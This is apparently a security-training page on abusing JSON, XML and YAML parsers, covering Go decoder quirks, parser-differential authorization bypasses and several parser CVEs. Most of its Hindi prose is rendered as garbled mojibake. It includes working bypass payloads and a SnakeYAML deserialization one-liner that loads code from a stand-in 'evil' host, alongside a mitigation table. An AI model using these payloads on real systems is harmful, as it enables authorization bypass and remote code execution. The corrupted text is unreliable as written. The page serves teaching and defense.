# JSON, XML & Yaml Hacking & рд╕рдорд╕реНрдпрд╛рдПрдБ

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

The following issues were detected in the Go JSON although they could be present in other languages as well. These issues were published in [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

GoтАЩs JSON, XML, and YAML parsers have a long trail of inconsistencies and insecure defaults that can be abused to **bypass authentication**, **escalate privileges**, or **exfiltrate sensitive data**.


### (Un)Marshaling Unexpected Data

рд▓рдХреНрд╖реНрдп рдЙрди structs рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлреАрд▓реНрдб рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ (рдЙрджрд╛., `IsAdmin`, `Password`)ред

- рдЙрджрд╛рд╣рд░рдг Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- рд╕рд╛рдорд╛рдиреНрдп рдХрдордЬреЛрд░рд┐рдпрд╛рдБ

1. **Missing tag** (рдХреЛрдИ рдЯреИрдЧ рдирд╣реАрдВ = рдлрд╝реАрд▓реНрдб рдлрд┐рд░ рднреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **`-` рдХрд╛ рдЧрд▓рдд рдЙрдкрдпреЛрдЧ**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // тЭМ wrong
}
```
Payload:
```json
{"-": true}
```
тЬФя╕П рдХрд┐рд╕реА рдлрд╝реАрд▓реНрдб рдХреЛ (un)marshaled рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рд╕рд╣реА рддрд░реАрдХрд╛:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### рдкрд╛рд░реНрд╕рд░ рднрд┐рдиреНрдирддрд╛рдПрдБ

рд▓рдХреНрд╖реНрдп рдпрд╣ рд╣реИ рдХрд┐ authorization рдХреЛ bypass рдХрд░рдирд╛, рдЗрд╕ рдмрд╛рдд рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рдХрд░ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди parsers рдПрдХ рд╣реА payload рдХреЛ рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╕реЗ interpret рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдлрд╝реАрд▓реНрдб:**
Go's `encoding/json` рд▓реЗрддрд╛ рд╣реИ **рдЖрдЦрд┐рд░реА** рдлрд╝реАрд▓реНрдбред
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
рдЕрдиреНрдп рдкрд╛рд░реНрд╕рд░ (рдЙрджрд╛., JavaтАЩs Jackson) рд╕рдВрднрд╡рддрдГ **рдкрд╣рд▓рд╛** рд▓реЗ рд╕рдХрддреЗ рд╣реИрдВред

**2. рдХреЗрд╕-рдЕрд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛:**
Go рдХреЗрд╕-рдЕрд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
рдпрд╣рд╛рдБ рддрдХ рдХрд┐ Unicode tricks рднреА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ:
```go
json.Unmarshal([]byte(`{"aтДкtion┼┐": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ:
- Proxy Go рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛
- AuthZ service Python рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛

Attacker sends:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python `UserAction` рдХреЛ рджреЗрдЦрддрд╛ рд╣реИ, рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
- Go `AdminAction` рдХреЛ рджреЗрдЦрддрд╛ рд╣реИ, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ


### рдбреЗрдЯрд╛ рдлрд╝реЙрд░реНрдореЗрдЯ рднреНрд░рдо (Polyglots)

рд▓рдХреНрд╖реНрдп рдЙрди рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдлреЙрд░реНрдореИрдЯреНрд╕ (JSON/XML/YAML) рдХреЛ рдорд┐рд▓рд╛рддреЗ рд╣реИрдВ рдпрд╛ рдкрд╛рд░реНрд╕рд░ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдкрд░ fail open рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
- **CVE-2020-16250**: HashiCorp Vault рдиреЗ JSON рдХреЛ XML parser рдХреЗ рд╕рд╛рде рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрдм STS рдиреЗ XML рдХреА рдмрдЬрд╛рдп JSON рд▓реМрдЯрд╛рдпрд╛ред

рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ:
- The `Accept: application/json` header
- JSON рдмреЙрдбреА рдХрд╛ рдЖрдВрд╢рд┐рдХ рдирд┐рдпрдВрддреНрд░рдг

Go рдХрд╛ XML parser рдиреЗ рдЗрд╕реЗ рдлрд┐рд░ рднреА рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдФрд░ рдЗрдВрдЬреЗрдХреНрдЯ рдХреА рдЧрдИ рдкрд╣рдЪрд╛рди рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░ рд▓рд┐рдпрд╛ред

- рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
рдкрд░рд┐рдгрд╛рдо:
- **Go JSON** parser: `Action_2` (case-insensitive + last wins)
- **YAML** parser: `Action_1` (case-sensitive)
- **XML** parser: рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрджрд░ `"Action_3"` рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рддрд╛ рд╣реИ

---

## рдЙрд▓реНрд▓реЗрдЦрдиреАрдп Parser Vulnerabilities (2023-2025)

> рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд╢реЛрд╖рдгрдпреЛрдЧреНрдп рдореБрджреНрджреЗ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд parsing рдПрдХ рдмрд╣реБ-рднрд╛рд╖реАрдп рд╕рдорд╕реНрдпрд╛ рд╣реИ тАФ рд╕рд┐рд░реНрдл Go рдХреА рд╕рдорд╕реНрдпрд╛ рдирд╣реАрдВред

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* рдкреНрд░рднрд╛рд╡рд┐рдд: `org.yaml:snakeyaml` < **2.0** (Spring-Boot, Jenkins рдЖрджрд┐ рдореЗрдВ рдЙрдкрдпреЛрдЧ).
* рдореВрд▓ рдХрд╛рд░рдг: `new Constructor()` **arbitrary Java classes** рдХреЛ deserializes рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ gadget chains рдмрдирддреЗ рд╣реИрдВ рдЬреЛ рдЕрдВрддрддрдГ remote-code execution рддрдХ рдкрд╣реБрдБрдЪрддреЗ рд╣реИрдВред
* One-liner PoC (vulnerable host рдкрд░ calculator рдЦреЛрд▓реЗрдЧрд╛):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* рд╕реБрдзрд╛рд░ / рд╢рдорди:
1. **тЙе2.0 рдкрд░ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ** (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `SafeLoader` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ).
2. рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░, рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* рдкреНрд░рднрд╛рд╡рд┐рдд: `libyaml` тЙд0.2.5 (рдХрдИ рднрд╛рд╖рд╛ рдмрд╛рдЗрдВрдбрд┐рдВрдЧреНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА C рд▓рд╛рдЗрдмреНрд░реЗрд░реА).
* рд╕рдорд╕реНрдпрд╛: `yaml_event_delete()` рдХреЛ рджреЛ рдмрд╛рд░ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдПрдХ double-free рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ DoS рдпрд╛ рдХреБрдЫ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ heap exploitation рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ.
* рд╕реНрдерд┐рддрд┐: Upstream рдиреЗ рдЗрд╕реЗ тАЬAPI misuseтАЭ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛, рд▓реЗрдХрд┐рди Linux distributions рдиреЗ рдкреИрдЪреНрдб **0.2.6** рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬреЛ рд░рдХреНрд╖рд╛рддреНрдордХ рд░реВрдк рд╕реЗ pointer рдХреЛ null-free рдХрд░ рджреЗрддрд╛ рд╣реИ.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* рдкреНрд░рднрд╛рд╡рд┐рдд: Tencent **RapidJSON** before commit `8269bc2` (<1.1.0-patch-22).
* рдмрдЧ: `GenericReader::ParseNumber()` рдореЗрдВ unchecked arithmetic рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдмрдбрд╝реЗ numeric literals рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ wrap around рдХрд░рдХреЗ heap рдХреЛ corrupt рдХрд░ рджреЗрддреЗ рд╣реИрдВ тАФ рдЕрдВрддрддрдГ рдЙрд╕ resulting object graph рдХрд╛ рдЙрдкрдпреЛрдЧ authorization decisions рдХреЗ рд▓рд┐рдП рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ privilege-escalation рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ.

---

### ЁЯФР рд╢рдорди (рдЕрджреНрдпрддрди)

| рдЬреЛрдЦрд┐рдо                                | рд╕рдорд╛рдзрд╛рди / рд╕рд┐рдлрд╛рд░рд┐рд╢                                      |
|-------------------------------------|------------------------------------------------------------|
| рдЕрдЬреНрдЮрд╛рдд рдлрд╝реАрд▓реНрдбреНрд╕ (JSON)               | `decoder.DisallowUnknownFields()`                          |
| рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдлрд╝реАрд▓реНрдбреНрд╕ (JSON)           | тЭМ stdlib рдореЗрдВ рдХреЛрдИ рдлрд┐рдХреНрд╕ рдирд╣реАрдВ тАФ [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) рд╕реЗ validate рдХрд░реЗрдВ |
| рдХреЗрд╕-рдЕрд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд┐рд▓рд╛рди (Go)          | тЭМ рдХреЛрдИ рдлрд┐рдХреНрд╕ рдирд╣реАрдВ тАФ struct tags рдХреЛ validate рдХрд░реЗрдВ + input рдХреЛ pre-canonicalize рдХрд░реЗрдВ   |
| XML garbage data / XXE              | рдПрдХ hardened parser рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (`encoding/xml` + `DisallowDTD`)     |
| YAML рдЕрдЬреНрдЮрд╛рдд рдХреБрдВрдЬрд┐рдпрд╛рдБ                 | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | SafeConstructor рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ / SnakeYAML тЙе2.0 рдкрд░ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ            |
| libyaml тЙд0.2.5 double-free          | **0.2.6** рдпрд╛ рдбistro-рдкреИрдЪреНрдб рд░рд┐рд▓реАрдЬрд╝ рдкрд░ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ            |
| RapidJSON <patched commit           | рдирд╡реАрдирддрдо RapidJSON (тЙеJuly 2024) рдХреЗ рд╕рд╛рде compile рдХрд░реЗрдВ              |

## рджреЗрдЦреЗрдВ рднреА

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## рд╕рдВрджрд░реНрдн

- Baeldung тАУ тАЬResolving CVE-2022-1471 With SnakeYAML 2.0тАЭ
- Ubuntu Security Tracker тАУ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
